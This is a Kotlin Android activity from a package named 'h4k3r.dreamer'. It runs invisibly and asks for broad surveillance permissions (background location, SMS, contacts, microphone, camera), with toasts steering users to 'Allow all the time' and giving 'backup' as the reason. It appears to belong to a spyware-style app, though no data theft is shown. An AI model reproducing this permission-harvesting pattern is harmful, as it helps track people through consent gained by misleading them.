package com.h4k3r.dreamer

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class PermissionHelperActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "PermissionHelper"
        private const val REQUEST_CODE_PERMISSION = 1001
    }

    private var permissionType: String? = null
    private var isBackgroundLocation = false
    private var groupName: String? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Setup transparent activity for better UX
        setupTransparentActivity()
        handleIntent()
    }

    private fun setupTransparentActivity() {
        // Make activity transparent and not show in recents
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        }

        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        )

        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )

        // Set transparent background
        window.setBackgroundDrawableResource(android.R.color.transparent)
    }

    private fun handleIntent() {
        // Check for multiple permissions first
        val multiplePermissions = intent.getStringArrayExtra("multiple_permissions")
        val permissionNames = intent.getStringArrayExtra("permission_names")
        groupName = intent.getStringExtra("group_name")
        isBackgroundLocation = intent.getBooleanExtra("is_background_location", false)

        if (multiplePermissions != null && multiplePermissions.isNotEmpty()) {
            // Handle multiple permissions
            Log.d(TAG, "Requesting multiple permissions: ${multiplePermissions.joinToString()}")

            // Show appropriate guidance based on group
            showPermissionGuidance(groupName, multiplePermissions.size)

            // Show rationale for each permission that needs it
            multiplePermissions.forEach { permission ->
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
                    showRationale(permission)
                }
            }

            // Small delay to let user read the guidance
            handler.postDelayed({
                // Request all permissions at once
                ActivityCompat.requestPermissions(
                    this,
                    multiplePermissions,
                    REQUEST_CODE_PERMISSION
                )
            }, 1500)
        } else {
            // Handle single permission (existing logic)
            val permission = intent.getStringExtra("runtime_permission") ?: ""
            permissionType = intent.getStringExtra("permission")

            if (permission.isNotEmpty()) {
                Log.d(TAG, "Requesting single permission: $permission")

                // Special handling for background location
                if (isBackgroundLocation) {
                    showBackgroundLocationGuidance()

                    handler.postDelayed({
                        ActivityCompat.requestPermissions(
                            this,
                            arrayOf(permission),
                            REQUEST_CODE_PERMISSION
                        )
                    }, 3000) // Longer delay for background location explanation
                } else {
                    if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
                        showRationale(permission)
                    }

                    ActivityCompat.requestPermissions(
                        this,
                        arrayOf(permission),
                        REQUEST_CODE_PERMISSION
                    )
                }
            } else {
                Log.e(TAG, "No permission specified")
                finish()
            }
        }
    }

    private fun showPermissionGuidance(groupName: String?, count: Int) {
        val message = when (groupName) {
            "Camera" -> "📷 Camera access is needed for photo and video capture.\n\nPlease tap 'Allow' when prompted."
            "Location" -> "📍 Location access is needed for GPS tracking.\n\nPlease tap 'Allow' for precise location."
            else -> "🔐 $count permissions are needed for the app to work properly.\n\nPlease grant all permissions when prompted."
        }

        Toast.makeText(this, message, Toast.LENGTH_LONG).show()

        // Show additional guidance after delay
        handler.postDelayed({
            val secondMessage = when (groupName) {
                "Camera" -> "Look for the camera permission dialog"
                "Location" -> "Look for the location permission dialog"
                else -> "Review each permission carefully"
            }
            Toast.makeText(this, "💡 $secondMessage", Toast.LENGTH_SHORT).show()
        }, 2500)
    }

    private fun showBackgroundLocationGuidance() {
        Toast.makeText(
            this,
            "📍 Background Location Permission\n\n" +
                    "For full location features, please:\n" +
                    "1. Select 'Allow all the time'\n" +
                    "2. Do NOT select 'Allow only while using app'",
            Toast.LENGTH_LONG
        ).show()

        handler.postDelayed({
            Toast.makeText(this, "💡 Look for 'Allow all the time' option", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    private fun showRationale(permission: String) {
        val rationale = when {
            permission.contains("CAMERA") -> "📷 Camera access is needed for capturing photos and videos"
            permission.contains("ACCESS_FINE_LOCATION") -> "📍 Precise location access is needed for accurate GPS tracking"
            permission.contains("ACCESS_BACKGROUND_LOCATION") -> "📍 Background location allows the app to track location even when not actively used"
            permission.contains("CONTACTS") -> "📞 Contacts access is needed to backup your contact list"
            permission.contains("SMS") -> "💬 SMS access is needed to backup your text messages"
            permission.contains("STORAGE") || permission.contains("MEDIA") -> "💾 Storage access is needed to manage your files"
            permission.contains("RECORD_AUDIO") -> "🎤 Microphone access is needed for audio recording"
            permission.contains("PHONE") -> "📱 Phone access is needed for device information"
            permission.contains("POST_NOTIFICATIONS") -> "🔔 Notification access is needed to show important alerts"
            else -> "🔐 This permission is required for the app to function properly"
        }

        Toast.makeText(this, rationale, Toast.LENGTH_LONG).show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE_PERMISSION) {
            val grantedPermissions = mutableListOf<String>()
            val deniedPermissions = mutableListOf<String>()

            // Process each permission result
            permissions.forEachIndexed { index, permission ->
                if (grantResults[index] == PackageManager.PERMISSION_GRANTED) {
                    grantedPermissions.add(permission)
                } else {
                    deniedPermissions.add(permission)
                }
            }

            val allGranted = deniedPermissions.isEmpty()
            val partiallyGranted = grantedPermissions.isNotEmpty() && deniedPermissions.isNotEmpty()

            Log.d(TAG, "Permission results - Granted: $grantedPermissions, Denied: $deniedPermissions")

            // Handle different scenarios
            when {
                allGranted -> {
                    Toast.makeText(this, "✅ All permissions granted!", Toast.LENGTH_SHORT).show()
                }
                partiallyGranted -> {
                    handlePartialPermissions(grantedPermissions, deniedPermissions)
                }
                else -> {
                    handleAllDenied(deniedPermissions)
                }
            }

            // Special handling for background location
            if (isBackgroundLocation) {
                handleBackgroundLocationResult(allGranted)
            }

            finishAndReport(allGranted, grantedPermissions, deniedPermissions)
        }
    }

    private fun handlePartialPermissions(granted: List<String>, denied: List<String>) {
        val criticalDenied = denied.any { permission ->
            permission.contains("CAMERA") || permission.contains("ACCESS_FINE_LOCATION")
        }

        if (criticalDenied) {
            Toast.makeText(
                this,
                "⚠️ Some critical permissions were denied. App functionality may be limited.",
                Toast.LENGTH_LONG
            ).show()

            handler.postDelayed({
                Toast.makeText(
                    this,
                    "You can enable missing permissions in Settings → Apps → Dreamer → Permissions",
                    Toast.LENGTH_LONG
                ).show()
            }, 2000)
        } else {
            Toast.makeText(
                this,
                "✅ Essential permissions granted. Some optional features may be limited.",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    private fun handleAllDenied(denied: List<String>) {
        // Check if any are permanently denied
        val permanentlyDenied = denied.any { permission ->
            !ActivityCompat.shouldShowRequestPermissionRationale(this, permission) &&
                    ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (permanentlyDenied) {
            Toast.makeText(
                this,
                "⚠️ Permissions were denied. Please enable them manually in Settings.",
                Toast.LENGTH_LONG
            ).show()

            handler.postDelayed({
                Toast.makeText(
                    this,
                    "Go to: Settings → Apps → Dreamer → Permissions",
                    Toast.LENGTH_LONG
                ).show()
            }, 2000)

            handler.postDelayed({
                openAppSettings()
            }, 4000)
        } else {
            Toast.makeText(
                this,
                "⚠️ Permissions denied. App functionality will be limited.",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    private fun handleBackgroundLocationResult(granted: Boolean) {
        if (granted) {
            Toast.makeText(
                this,
                "✅ Background location enabled! Full location features are now available.",
                Toast.LENGTH_SHORT
            ).show()
        } else {
            Toast.makeText(
                this,
                "⚠️ Background location denied. Location will only work when app is open.",
                Toast.LENGTH_LONG
            ).show()

            handler.postDelayed({
                Toast.makeText(
                    this,
                    "You can enable it later in Settings → Apps → Dreamer → Permissions → Location → Allow all the time",
                    Toast.LENGTH_LONG
                ).show()
            }, 2000)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        // Only handle runtime permissions now, no special permissions
    }

    private fun openAppSettings() {
        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }

        try {
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open app settings", e)
        }
    }

    private fun finishAndReport(success: Boolean, granted: List<String>, denied: List<String>) {
        // Report back to SmartPermissionManager via broadcast
        val resultIntent = Intent("com.h4k3r.dreamer.PERMISSION_RESULT").apply {
            putExtra("permission", permissionType)
            putExtra("granted", success)
            putExtra("granted_permissions", granted.toTypedArray())
            putExtra("denied_permissions", denied.toTypedArray())
            putExtra("group_name", groupName)
            putExtra("is_background_location", isBackgroundLocation)
        }
        sendBroadcast(resultIntent)

        // Small delay before finishing to let user see the result
        handler.postDelayed({
            finish()
            overridePendingTransition(0, 0)
        }, 1000)
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}